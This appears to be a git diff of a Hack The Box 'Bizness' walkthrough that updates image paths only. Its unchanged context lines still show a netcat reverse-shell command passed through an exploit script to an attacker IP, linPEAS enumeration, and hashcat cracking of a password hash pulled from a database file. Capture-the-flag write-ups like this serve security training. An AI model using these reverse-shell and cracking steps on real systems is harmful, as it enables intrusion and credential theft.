@@ -95,7 +95,7 @@ Now we can run commands on the target. So we can try to get a Reverse Shell usin
 </strong><strong>python3 exploit.py --url https://bizness.htb/ --cmd 'nc 10.10.14.19 7777'
 </strong></code></pre>
 
-<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption><p>Exploit first try</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption><p>Exploit first try</p></figcaption></figure>
 
 However, as we can see here, we aren't getting any responses from the server despite providing commands through Netcat.
 
@@ -107,7 +107,7 @@ python3 exploit.py --url https://bizness.htb/ --cmd 'nc -c bash 10.10.14.19 7777
 # -c = specifies shell commands to execute after a connection. In this case, we're specifying we want to use bash
 ```
 
-<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption><p>Exploit Successful</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption><p>Exploit Successful</p></figcaption></figure>
 
 
 
@@ -115,7 +115,7 @@ python3 exploit.py --url https://bizness.htb/ --cmd 'nc -c bash 10.10.14.19 7777
 
 From there, we just need to grab the user flag in the "_ofbiz_" home directory:
 
-<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption><p>User flag</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption><p>User flag</p></figcaption></figure>
 
 Now, before we do anything else, let's get a full TTY Shell. The best way to do this is using this Python script:
 
@@ -153,11 +153,11 @@ We can start by doing some basic enumeration. After that, if we aren't able to f
 </strong><strong>./linpeas.sh
 </strong></code></pre>
 
-<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption><p>Transfering linPEAS to the target machine</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption><p>Transfering linPEAS to the target machine</p></figcaption></figure>
 
 LinPEAS shows us that there's an executable our user has write access to:
 
-<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption><p>LinPEAS shows an executable file our low level user has write access to</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption><p>LinPEAS shows an executable file our low level user has write access to</p></figcaption></figure>
 
 However, we can only abuse this to create a backdoor. [This link](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services) should provide you with an explanation.
 
@@ -165,11 +165,11 @@ So we'll need to enumerate further.
 
 If we continue our enumeration, we'll be able to find a password in the `c54d0.dat` file located in the `/opt/ofbiz/runtime/data/derby/ofbiz/seg0` directory:
 
-<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption><p>SALT part of the hash</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption><p>SALT part of the hash</p></figcaption></figure>
 
 Now, before we crack this hash, [we'll need to decode the hash](https://www.linkedin.com/pulse/bizness-htb-walkthrough-laith-younes-laith-younes--jtqhe) using [CyberChef](https://gchq.github.io/CyberChef/#recipe=Find\_/\_Replace\(%7B'option':'Regex','string':'\_'%7D,'/',false,false,false,false\)Find\_/\_Replace\(%7B'option':'Regex','string':'-'%7D,'%2B',false,false,false,false\)From\_Base64\('A-Za-z0-9%2B/%3D',false,false\)To\_Hex\('None',0\)\&input=dVAwX1FhVkJwRFdGZW84LWRSekRxUndYUTJJ):
 
-<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption><p>Decoded hash</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption><p>Decoded hash</p></figcaption></figure>
 
 So we can use "_hashcat_" with the hash mode of 120 to crack it:
 
@@ -179,7 +179,7 @@ hashcat -m 120 '<hash>:d' /usr/share/wordlists/rockyou.txt
 # -m = mode
 ```
 
-<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption><p>Here's our cracked password</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption><p>Here's our cracked password</p></figcaption></figure>
 
 ###
 
